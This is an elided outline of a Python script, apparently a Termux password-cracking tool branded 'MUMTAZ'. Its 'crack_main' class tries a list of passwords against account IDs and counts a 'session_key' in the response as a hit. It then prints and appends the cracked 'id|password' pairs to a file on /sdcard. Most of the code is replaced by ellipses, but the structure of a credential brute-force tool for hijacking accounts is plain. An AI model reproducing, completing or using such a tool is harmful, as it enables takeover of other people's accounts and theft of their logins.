...
logo= f'''                                                                                             
 ...
 __       __  __    __  __       __  ________   ______   ________       
...
def main():
        ...
        if menu_opt =='1':
                ...
                os.system('xdg-open https://github.com/Mumtazshah/Qnumber')
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                ...
                try:
                        ...
                        sys.stdout.write('\r[MUMTAZ] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        ...
                                        print(' \033[1;32m[MUMTAZ-OK] '+roid+' | '+pas+'\033[0;97m')
                                        ...
                                        open('/sdcard/MUMTAZ_ok.txt','a').write(roid+'|'+pas+'\n')
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/MUMTAZ_ok.txt')
...
if '/data/data/com.termux/files/home/MUMTAZ' in datar:
